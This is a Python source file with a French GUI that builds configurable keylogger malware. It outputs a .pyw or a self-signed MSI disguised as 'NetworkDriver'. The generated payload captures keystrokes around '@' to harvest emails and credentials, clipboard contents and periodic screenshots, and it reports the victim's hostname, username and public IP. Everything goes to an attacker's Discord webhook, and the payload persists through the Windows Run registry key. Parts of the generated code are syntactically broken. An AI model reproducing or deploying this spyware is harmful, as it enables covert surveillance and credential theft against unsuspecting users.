from pynput import keyboard
import sys
import time
import customtkinter as ctk
from tkinter import messagebox
import requests
import shutil
import json
import os
from datetime import datetime
import clipboard
import threading
from PIL import ImageGrab
import io
import cx_Freeze
import platform
import winreg
import getpass
import socket

ordi = platform.uname()


historique = []
capture_apres_at = False
apres_at_buffer = []
compteur = 0

hostname = socket.gethostname()

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("dark-blue")

# ---------------- VARIABLES GLOBALES ----------------
debut_heure = None
fin_heure = None
nom_fichier = "NetworkDriver"  

# ---------------- FONCTIONS ----------------
def valider_webhook():
    if webhook_entry.get().strip() == "":
        messagebox.showerror("Erreur", "Le champ du webhook ne peut pas être vide.")


# Option choix du nom du keylogs
def nom_keylogs():
    global nom_fichier
    nom_window = ctk.CTkToplevel(app)
    nom_window.geometry("400x200")
    nom_window.title("Choix du nom du keylogs")

    nom_label = ctk.CTkLabel(nom_window, text="Entrez le nom du fichier keylogs sans l'extension:", font=ctk.CTkFont(size=14))
    nom_label.pack(pady=10)
    nom_entry = ctk.CTkEntry(nom_window, width=200, font=ctk.CTkFont(size=14))
    nom_entry.pack(pady=10)

    def valider():
        global nom_fichier
        nom = nom_entry.get().strip()
        if nom == "":
            messagebox.showerror("Si aucun nom choisi le nom sera (WindowsDriver) ")
        nom_fichier = nom
        nom_window.destroy()

    valider_nom_btn = ctk.CTkButton(nom_window, text="Valider", font=ctk.CTkFont(size=14), command=valider)
    valider_nom_btn.pack(pady=20)

# ---------------- OPTIONS ----------------
def screenshot_option_func():
    while True:
        im = ImageGrab.grab()
        buffer = io.BytesIO()
        im.save(buffer, format="PNG")
        buffer.seek(0)
        webhook_url = webhook_entry.get()
        files = {'file': ('screenshot.png', buffer, 'image/png')}
        message = "Screenshot envoyé"
        requests.post(webhook_url, json=message,files=files)
        time.sleep(60)

def clipboard_option_func():
    old = clipboard.paste()
    webhook_url = webhook_entry.get()
    while True:
        time.sleep(1)
        mtn = clipboard.paste()
        message = "Presse papier : "
        if old != mtn:
            requests.post(webhook_url, json={message, mtn})
            im = ImageGrab.grab()
            buffer = io.BytesIO()
            im.save(buffer, format="PNG")
            buffer.seek(0)
            files = {'file': ('screenshot.png', buffer, 'image/png')}
            message = "Screenshot envoyé"
            requests.post(webhook_url, json=message,files=files)
            old = mtn

def autostart_option_func(script_path=None, name="NetworkDriver"):
    # Chemin du script Python
    if script_path is None:
        script_path = os.path.abspath(__file__)

    # Chemin vers python.exe utilisé pour lancer ton script
    python_exe = sys.executable

    # Commande complète à lancer au démarrage
    command = f'"{python_exe}" "{script_path}"'

    # On ouvre la clé Run dans le registre
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE
    )

    # On écrit la commande dans la clé
    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
    winreg.CloseKey(key)
    




def capture_before_after_at_option_func():
    def touche(key):
        webhook = webhook_entry.get()
        global historique, capture_apres_at, apres_at_buffer, compteur
        try:
            caractere = key.char
            historique.append(caractere)
            if capture_apres_at:
                apres_at_buffer.append(caractere)
                compteur += 1
                if compteur >= 50:
                    print("\n--- 20 caractères après @ ---")
                    print(''.join(apres_at_buffer))
                    print("--------------------------------\n")
                    capture_apres_at = False
                    apres_at_buffer = []
                    compteur = 0
        except AttributeError:
            print(f"Special key {key} pressed")

        if hasattr(key, 'char') and key.char == '@':
            print("\n--- 16 caractères avant @ ---")
            print(''.join(historique[-30:]))
            print("--------------------------------")
            capture_apres_at = True
            apres_at_buffer = []
            compteur = 0

        im = ImageGrab.grab()
        buffer = io.BytesIO()
        im.save(buffer, format="PNG")
        buffer.seek(0)
        webhook_url = webhook_entry.get()
        files = {'file': ('screenshot.png', buffer, 'image/png')}
        message = "Screenshot envoyé"
        requests.post(webhook, json=message,files=files)

        

    with keyboard.Listener(on_press=touche) as listener:
        listener.join()

def low_and_slow_option_func():
    messagebox.showinfo("Information", "L'option 'Low and Slow' a été sélectionnée.")

def alert_on_infection_option_func():
    discord_webhook = webhook_entry.get()
    ip = requests.get("https://api.ipify.org").text
    name = (
        f"Nom de l'ordinateur : {ordi.node}"
        f"Utilisateur actuel : {getpass.getuser()}"
        f"Nom de l'ordinateur : {ordi.node}"
        f"Adresse IP : {socket.gethostbyname(hostname)}"
        f"Adresse IP publique {ip}"
        )

    requests.post(discord_webhook, json={"content": name})
    

def test_webhook():
    test = webhook_entry.get().strip()
    if test == "":
        messagebox.showerror("Erreur", "Le webhook Discord ne peut pas être vide pour ce test.")
        return
    message = {"content": "Ceci est un message de test pour vérifier le webhook Discord."}
    envoyer = requests.post(test, json=message)
    if envoyer.status_code == 204:
        messagebox.showinfo("Succès", "Le webhook Discord fonctionne correctement.")
    else:
        messagebox.showerror("Erreur", f"Le webhook Discord a échoué avec le code d'erreur : {envoyer.status_code}")

# ---------------- BUILDER ----------------
def lancer_programme():

    if switch.get() == 1:
        pyw()
    else:
        msi()



temp_script = f"{nom_fichier}.pyw"


def pyw():
    global nom_fichier
    global temp_script

    messagebox.showinfo(message="Vous allez générer uniquement le keyloger en .pyw qui fonctionnera dès l'execution")

    if nom_fichier.strip() == "":
        messagebox.showerror("Erreur", "Nom du fichier vide")
        return


    config = {
        "webhook": webhook_entry.get().strip(),
        "options": {
            "screenshot": screenshot_var.get(),
            "clipboard": clipboard_var.get(),
            "autostart": autostart_var.get(),
            "capture_before_after_at": capture_var.get(),
            "alert_on_infection": alert_var.get()
        }
    }

    if config["webhook"] == "":
        messagebox.showerror("Erreur", "Veuillez entrer un webhook avant de continuer.")
        return

    # Fichier est maintenant écrit DANS le with open()
    with open(temp_script, "w", encoding="utf-8") as f:
        f.write(f"WEBHOOK = '{config['webhook']}'\n\n")
        f.write("OPTIONS = {\n")
        for option, valeur in config["options"].items():
            f.write(f"    '{option}': {valeur},\n")
        f.write("}\n\n")

        f.write("import threading\n\n")

        # Screenshot
        if config["options"]["screenshot"]:
            f.write("import requests, io\nfrom PIL import ImageGrab\n")
            f.write("def screenshot_option_func():\n")
            f.write("    while True:\n")
            f.write("       im = ImageGrab.grab()\n")
            f.write("       buffer = io.BytesIO()\n")
            f.write("       im.save(buffer, format='PNG')\n")
            f.write("       buffer.seek(0)\n")
            f.write("       files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
            f.write("       requests.post(WEBHOOK, files=files)\n\n")
            f.write("       time.sleep(60)")

        # Clipboard
        if config["options"]["clipboard"]:
            f.write("import clipboard, time, requests\n")
            f.write("def clipboard_option_func():\n")
            f.write("    old = clipboard.paste()\n")
            f.write("    while True:\n")
            f.write("        time.sleep(1)\n")
            f.write("        mtn = clipboard.paste()\n")
            f.write('        message = "Presse papier :"\n ' )
            f.write("       if old != mtn:\n")
            f.write("            requests.post(WEBHOOK, json={message, mtn})\n")
            f.write("            im = ImageGrab.grab()\n")
            f.write("            buffer = io.BytesIO()\n")
            f.write("            im.save(buffer, format='PNG')\n")
            f.write("            buffer.seek(0)\n")
            f.write("            files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
            f.write('            message = "Screenshot envoyé"\n')
            f.write("            requests.post(WEBHOOK, json=message,files=files)\n")
            f.write("            old = mtn\n\n")

        # Capture avant/après @
        if config["options"]["capture_before_after_at"]:
            f.write("import requests, time\nfrom pynput import keyboard\nimport io\nfrom PIL import ImageGrab\n")
            f.write("historique = []\n")
            f.write("capture_apres_at = False\n")
            f.write("apres_at_buffer = []\n")
            f.write("compteur = 0\n\n")
            f.write("def capture_before_after_at_option_func():\n")
            f.write("    def touche(key):\n")
            f.write("        global historique, capture_apres_at, apres_at_buffer, compteur\n")
            f.write("        try:\n")
            f.write("            caractere = key.char\n")
            f.write("            historique.append(caractere)\n")
            f.write("            if capture_apres_at:\n")
            f.write("                apres_at_buffer.append(caractere)\n")
            f.write("                compteur += 1\n")
            f.write("                if compteur >= 50:\n")
            f.write("                    data = 'Avant @: ' + ''.join(historique[-50:]) + '\\nApres @: ' + ''.join(apres_at_buffer)\n")
            f.write("                    requests.post(WEBHOOK, json={'content': data})\n")
            f.write("                    capture_apres_at = False\n")
            f.write("                    apres_at_buffer = []\n")
            f.write("                    compteur = 0\n")
            f.write("        except AttributeError:\n")
            f.write("            pass\n")
            f.write("        if hasattr(key, 'char') and key.char == '@':\n")
            f.write("            capture_apres_at = True\n")
            f.write("            apres_at_buffer = []\n")
            f.write("            compteur = 0\n\n")
            f.write("    with keyboard.Listener(on_press=touche) as listener:\n")
            f.write("        listener.join()\n\n")
            f.write("im = ImageGrab.grab()\n")
            f.write("buffer = io.BytesIO()\n")
            f.write("im.save(buffer, format='PNG')\n")
            f.write("buffer.seek(0)\n")
            f.write("files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
            f.write('message = "Screenshot envoyé"\n')
            f.write("requests.post(WEBHOOK, json=message,files=files)\n")


        # Démarrage automatique
        if config["options"]["autostart"]:
            f.write("import sys, os, winreg\n\n")
            f.write("def autostart_option_func(script_path=None, name='NetworkDriver''):\n")
            f.write("   if script_path is None:\n")
            f.write("       script_path = os.path.abspath(__file__)\n\n")
            f.write("   python_exe = sys.executable\n\n")
            f.write("   command = f''{python_exe}' '{script_path}''\n\n")
            f.write("   key = winreg.OpenKey(\n")
            f.write("       winreg.HKEY_CURRENT_USER,\n")
            f.write("       r'Software\Microsoft\Windows\CurrentVersion\Run',\n")
            f.write("       0,\n")
            f.write("       winreg.KEY_SET_VALUE\n")
            f.write("   )\n\n")
            f.write("    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)\n")
            f.write("    winreg.CloseKey(key)\n")


        # Alerte si infection
        if config["options"]["alert_on_infection"]:
            f.write(
                'import getpass, platform, socket, requests\n'
                'ordi = platform.node()\n'
                'hostname = socket.gethostname()\n\n'
                'def alert_on_infection_option_func():\n'
                '   ip = requests.get("https://api.ipify.org").text\n'
                '    discord_webhook = WEBHOOK\n'
                '    name = (\n'
                '        f"Nom de l\'ordinateur : {ordi}\\n"'
                '        f"Utilisateur actuel : {getpass.getuser()}\\n"'
                '        f"Adresse IP : {socket.gethostbyname(hostname)}\n"'
                '        f"Adresse IP publique {ip}"'
                '    )\n'
                '    requests.post(discord_webhook, json={"content": name})\n\n'
            )

        # Lancement des threads
        f.write("if __name__ == '__main__':\n")
        for opt, val in config["options"].items():
            if val:
                f.write(f"    threading.Thread(target={opt}_option_func).start()\n")


        messagebox.showinfo(title="Fini", message="Le fichier a été créer avec succès")

import subprocess

def msi():
    global nom_fichier
    global temp_script

    # Vérifie que le .pyw existe
    if not os.path.exists(temp_script):
        pyw()  # Génère le fichier .pyw

    setup_filename = "setup_msi_temp.py"



    # Création du fichier setup pour cx_Freeze
    with open(setup_filename, "w", encoding="utf-8") as f:
        f.write(
            "from cx_Freeze import setup, Executable\n\n"
            f"setup(\n"
            f"    name='{nom_fichier}',\n"
            f"    version='1.0',\n"
            f"    description='Programme créé avec le builder',\n"
            f"    options={{\n"
            f"        'build_exe': {{\n"
            f"            'packages': ['pynput', 'customtkinter', 'requests', 'clipboard', 'PIL', 'getpass', 'platform', 'socket', 'time', 'io'],\n"
            f"            'include_files': []\n"
            f"        }}\n"
            f"    }},\n"
            f"    executables=[Executable('{temp_script}', base='Win32GUI')]\n"
            f")\n"
        )

    # Lancement de la génération MSI avec subprocess
    result = subprocess.run(["python", setup_filename, "bdist_msi"], capture_output=True, text=True)
    if result.returncode != 0:
        messagebox.showerror("Erreur", f"La génération du MSI a échoué :\n{result.stderr}")
        return

    dist_dir = "dist"
    if not os.path.exists(dist_dir):
        messagebox.showerror("Erreur", "Le dossier 'dist' est introuvable après la génération du MSI !")
        return

    output_dir = "WindowsNetwork-.x64msi"
    os.makedirs(output_dir, exist_ok=True)

    msi_files = [f for f in os.listdir(dist_dir) if f.endswith(".msi")]
    if not msi_files:
        messagebox.showerror("Erreur", "Aucun MSI généré !")
        return

    for msi_file in msi_files:
        shutil.move(os.path.join(dist_dir, msi_file), os.path.join(output_dir, msi_file))

    # Nettoyage
    for file in [temp_script, setup_filename]:
        if os.path.exists(file):
            os.remove(file)
    if os.path.exists("build"):
        shutil.rmtree("build")
    if os.path.exists("dist"):
        shutil.rmtree("dist")


    # Chatgpt qui a fait la partie certificat
    def generer_certificat_auto():
        # Génère un certificat auto-signé
        cmd = [
            "powershell", "-Command",
            'New-SelfSignedCertificate -Type CodeSigning -Subject "CN=Networkdriver" -CertStoreLocation "Cert:\\CurrentUser\\My"'
        ]
        subprocess.run(cmd, capture_output=True, text=True)

    def exporter_certificat_pfx(pfx_path, password):
        cmd = [
            "powershell", "-Command",
            f'$pwd = ConvertTo-SecureString -String "{password}" -Force -AsPlainText; '
            '$cert = Get-ChildItem Cert:\\CurrentUser\\My | Where-Object {{ $_.Subject -eq "CN=MonLogiciel" }}; '
            f'Export-PfxCertificate -Cert $cert -FilePath "{pfx_path}" -Password $pwd'
        ]
        subprocess.run(cmd, capture_output=True, text=True)

    def signer_msi(msi_path, pfx_path, password):
        cmd = [
            "signtool", "sign",
            "/f", pfx_path,
            "/p", password,
            "/fd", "SHA256",
            "/v",
            msi_path
        ]
        return subprocess.run(cmd, capture_output=True, text=True)


    def signer_msi_auto(msi_file_path):
        pfx_path = os.path.expanduser("~/moncert.pfx")
        password = "motdepasse123"  # Mets ce que tu veux

        # 1️⃣ Génération certificat
        generer_certificat_auto()

        # 2️⃣ Export PFX
        exporter_certificat_pfx(pfx_path, password)

        # 3️⃣ Signature MSI
        result = signer_msi(msi_file_path, pfx_path, password)

        if result.returncode == 0:
            messagebox.showinfo("Succès", "Le MSI a été signé automatiquement avec un certificat auto-signé !")
        else:
            messagebox.showerror("Erreur", f"Échec de la signature :\n{result.stderr}")


        messagebox.showinfo("Succès", f"✅ MSI créé dans {output_dir}/, prêt à l'installation !")


# ---------------- INTERFACE ----------------
app = ctk.CTk()
app.geometry("900x700")
app.title("Configuration du Keylogger")

titre = ctk.CTkLabel(app, text="Configuration du Keylogger", font=ctk.CTkFont(size=20, weight="bold"))
titre.pack(pady=20)

instructions = ctk.CTkLabel(app, text="Entrez le nom du webhook Discord pour envoyer les logs capturés :", font=ctk.CTkFont(size=16))
instructions.pack(pady=10)
webhook_entry = ctk.CTkEntry(app, width=400, font=ctk.CTkFont(size=14), placeholder_text="https://discord.com/api/webhooks/...")
webhook_entry.pack(pady=10)

webhook_btn = ctk.CTkButton(app, text="Valider", font=ctk.CTkFont(size=14), command=valider_webhook)
webhook_btn.pack(pady=10)

test_btn = ctk.CTkButton(app, text="Tester le webhook", font=ctk.CTkFont(size=14), command=test_webhook)
test_btn.pack(pady=10)

# Variables reliées aux cases à cocher
choix_nom_var = ctk.BooleanVar(value=False)
screenshot_var = ctk.BooleanVar(value=False)
clipboard_var = ctk.BooleanVar(value=False)
autostart_var = ctk.BooleanVar(value=False)
activity_time_var = ctk.BooleanVar(value=False)
capture_var = ctk.BooleanVar(value=False)
low_slow_var = ctk.BooleanVar(value=False)
alert_var = ctk.BooleanVar(value=False)

def text():
    if switch.get() == 1:
        jsp.set(".pyw")
    else:
        jsp.set(".msi")

jsp = ctk.StringVar(value=".msi")

# Cases à cocher
choix_nom = ctk.CTkCheckBox(app, text="Choix du nom du keylogs", variable=choix_nom_var, command=nom_keylogs)
choix_nom.pack(pady=5)
screenshot_option = ctk.CTkCheckBox(app, text="Capture d'écran chaque minute", variable=screenshot_var)
screenshot_option.pack(pady=5)
clipboard_option = ctk.CTkCheckBox(app, text="Capture du presse-papier", variable=clipboard_var)
clipboard_option.pack(pady=5)
autostart_option = ctk.CTkCheckBox(app, text="Démarrage automatique", variable=autostart_var)
autostart_option.pack(pady=5)
capture_before_after_at_option = ctk.CTkCheckBox(app, text="Capture avant @ et après", variable=capture_var)
capture_before_after_at_option.pack(pady=5)
alert_on_infection_option = ctk.CTkCheckBox(app, text="Alerte si contamination", variable=alert_var)
alert_on_infection_option.pack(pady=5)
switch = ctk.CTkSwitch(app, textvariable=jsp, command=text)
switch.pack()



# Bouton lancer
lancer_btn = ctk.CTkButton(app, text="Lancer le programme", font=ctk.CTkFont(size=16, weight="bold"), command=lancer_programme)
lancer_btn.pack(pady=20)

"""
with open("logs.txt", "a") as fichier:
        fichier.write(
            f"------------------------------------\n"
            f"\n"
            f" [{time.strftime('%d-%m-%Y %H:%M:%S')}]     Ouverture du Keylog \n"
            f"\n"
            f"------------------------------------\n"
            f"\n"
        )
        """

def key():
    app.mainloop()
